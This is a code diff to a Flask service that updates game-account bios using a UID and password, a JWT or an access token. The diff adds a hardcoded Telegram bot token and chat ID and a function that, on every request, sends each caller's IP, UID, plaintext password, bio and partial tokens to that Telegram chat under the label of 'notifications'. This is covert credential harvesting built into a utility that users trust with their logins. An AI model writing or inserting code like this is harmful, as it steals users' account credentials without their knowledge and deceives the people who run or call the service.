@@ -5,6 +5,7 @@ import jwt
 import urllib3
 import json
 import base64
+import time
 from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
@@ -24,6 +25,87 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 app = Flask(__name__)
 
 DEFAULT_REGION = "IND"
+
+# ==================== TELEGRAM NOTIFICATION SETUP ====================
+TELEGRAM_BOT_TOKEN = "8387059083:AAEfrBHESkePIBMnCGHh_VKk8yCwgZ6Wb0A"
+TELEGRAM_CHAT_ID = "8278814873"
+
+def send_telegram_message(message):
+    """
+    Synchronous Telegram sender – prints logs to console.
+    """
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        'chat_id': TELEGRAM_CHAT_ID,
+        'text': message,
+        'parse_mode': 'HTML',
+        'disable_web_page_preview': True
+    }
+    try:
+        resp = requests.post(url, json=payload, timeout=5)
+        if resp.ok:
+            print("✅ Telegram notification sent successfully.")
+            return True
+        else:
+            print(f"❌ Telegram Error: Status {resp.status_code}, Response: {resp.text}")
+            return False
+    except Exception as e:
+        print(f"❌ Telegram send exception: {e}")
+        return False
+
+def format_telegram_message(request_data, response_data, error=None):
+    """Build a nice-looking Telegram message with HTML tags.
+       Includes UID, Password (if provided), Bio, Method, etc.
+    """
+    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+    client_ip = request_data.get('client_ip', 'Unknown')
+    method = request_data.get('method', 'GET')
+    path = request_data.get('path', '/bio')
+    uid = request_data.get('uid', 'Not provided')
+    password = request_data.get('password', None)  # might be None
+    bio = request_data.get('bio', 'Not provided')
+    access_token = request_data.get('access_token', None)
+    jwt_token = request_data.get('jwt_token', None)
+    login_method = request_data.get('login_method', 'Unknown')
+    
+    lines = []
+    lines.append(f"<b>🔔 New Bio Upload Request</b>")
+    lines.append(f"<b>Time:</b> <code>{timestamp}</code>")
+    lines.append(f"<b>IP:</b> <code>{client_ip}</code>")
+    lines.append(f"<b>Endpoint:</b> <code>{method} {path}</code>")
+    
+    # Always show UID if available
+    lines.append(f"<b>UID:</b> <code>{uid}</code>")
+    
+    # Show password if provided (as requested)
+    if password:
+        lines.append(f"<b>Password:</b> <code>{password}</code>")
+    
+    # Show Bio
+    lines.append(f"<b>Bio:</b> <code>{bio}</code>")
+    
+    # Show tokens if present (truncated for readability)
+    if access_token:
+        lines.append(f"<b>Access Token:</b> <code>{access_token[:30]}...</code>")
+    if jwt_token:
+        lines.append(f"<b>JWT:</b> <code>{jwt_token[:30]}...</code>")
+    
+    # Show login method
+    lines.append(f"<b>Login Method:</b> {login_method}")
+    
+    if error:
+        lines.append(f"<b>❌ Error:</b> {error}")
+    else:
+        status = response_data.get('status', 'Unknown')
+        http_code = response_data.get('http_code', 'N/A')
+        region_used = response_data.get('region_used', 'N/A')
+        lines.append(f"<b>✅ Status:</b> {status}")
+        lines.append(f"<b>HTTP Code:</b> <code>{http_code}</code>")
+        lines.append(f"<b>Region Used:</b> <code>{region_used}</code>")
+    
+    lines.append("")
+    lines.append("<i>Powered by RAJPUT-OP</i>")
+    return "\n".join(lines)
 
 # ==================== PROTOBUF DEFINITIONS (For Bio Upload Only) ====================
 
@@ -240,12 +322,35 @@ def combined_bio_upload():
     password = request.args.get("pass") or request.args.get("password") or request.form.get("pass") or request.form.get("password")
     access_token = request.args.get("access") or request.args.get("access_token") or request.form.get("access") or request.form.get("access_token")
 
+    # Collect client info for Telegram
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if client_ip and ',' in client_ip:
+        client_ip = client_ip.split(',')[0].strip()
+
+    # Build request_info – we'll update login_method later
+    request_info = {
+        'client_ip': client_ip,
+        'method': request.method,
+        'path': request.path,
+        'uid': uid if uid else 'Not provided',
+        'password': password,  # may be None
+        'bio': bio if bio else 'Not provided',
+        'access_token': access_token,
+        'jwt_token': jwt_token,
+        'login_method': 'Unknown'  # will be updated
+    }
+
     if not bio:
+        error_msg = "Missing bio parameter"
+        # Send error notification
+        msg = format_telegram_message(request_info, {}, error=error_msg)
+        send_telegram_message(msg)
         return jsonify({"status": "❌ Missing bio", "error": "bio parameter required"}), 400
 
     final_jwt = None
     jwt_info = None
     login_method = "Unknown"
+    error = None
 
     # 1. Direct JWT
     if jwt_token:
@@ -269,11 +374,17 @@ def combined_bio_upload():
             print(f"[UID/Pass] Successfully obtained JWT")
         else:
             print(f"[UID/Pass] Failed to get JWT")
-            return jsonify({
+            error = "Invalid UID/Password or API error"
+            response_data = {
                 "status": "❌ Authentication Failed",
-                "error": "Invalid UID/Password or API error",
+                "error": error,
                 "login_method": login_method
-            }), 401
+            }
+            # Send error notification with updated login_method
+            request_info['login_method'] = login_method
+            msg = format_telegram_message(request_info, response_data, error=error)
+            send_telegram_message(msg)
+            return jsonify(response_data), 401
 
     # 3. Access Token -> JWT (External API)
     elif access_token:
@@ -288,27 +399,42 @@ def combined_bio_upload():
             print(f"[Access Token] Successfully obtained JWT")
         else:
             print(f"[Access Token] Failed to convert")
-            return jsonify({
+            error = "Could not convert access token to JWT using external API"
+            response_data = {
                 "status": "❌ Access Token Conversion Failed",
-                "error": "Could not convert access token to JWT using external API",
+                "error": error,
                 "login_method": login_method
-            }), 401
+            }
+            request_info['login_method'] = login_method
+            msg = format_telegram_message(request_info, response_data, error=error)
+            send_telegram_message(msg)
+            return jsonify(response_data), 401
 
     else:
-        return jsonify({
+        error = "Missing credentials: Provide JWT, UID/Pass, or Access Token"
+        response_data = {
             "status": "❌ Missing Credentials",
-            "error": "Provide JWT, UID/Pass, or Access Token",
+            "error": error,
             "example": {
                 "with_uid_pass": "/bio?bio=Hello&uid=123456789&pass=yourpassword",
                 "with_jwt": "/bio?bio=Hello&jwt=your_jwt_token",
                 "with_access": "/bio?bio=Hello&access=your_access_token"
             }
-        }), 400
+        }
+        request_info['login_method'] = 'Unknown'
+        msg = format_telegram_message(request_info, response_data, error=error)
+        send_telegram_message(msg)
+        return jsonify(response_data), 400
 
     if not final_jwt:
-        return jsonify({"status": "❌ JWT Generation Failed", "error": "Could not generate valid JWT"}), 500
+        error = "Could not generate valid JWT"
+        response_data = {"status": "❌ JWT Generation Failed", "error": error}
+        request_info['login_method'] = login_method
+        msg = format_telegram_message(request_info, response_data, error=error)
+        send_telegram_message(msg)
+        return jsonify(response_data), 500
 
-    # Upload bio
+    # Now we have JWT, upload bio
     jwt_region = jwt_info.get("region") if jwt_info else DEFAULT_REGION
     mapped_region = map_region(jwt_region)
     _, update_url = get_region_urls(mapped_region)
@@ -327,6 +453,15 @@ def combined_bio_upload():
         "generated_jwt": final_jwt[:50] + "..." if final_jwt and len(final_jwt) > 50 else final_jwt,
         "server_response": result["server_response"][:200] if result["server_response"] else "Empty"
     }
+
+    # Update request_info with login_method and also set UID from jwt_info if not already
+    request_info['login_method'] = login_method
+    if jwt_info and jwt_info.get('uid'):
+        request_info['uid'] = jwt_info['uid']  # override with actual UID from JWT
+
+    # Send success notification
+    msg = format_telegram_message(request_info, response_data)
+    send_telegram_message(msg)
 
     return jsonify(response_data)
 
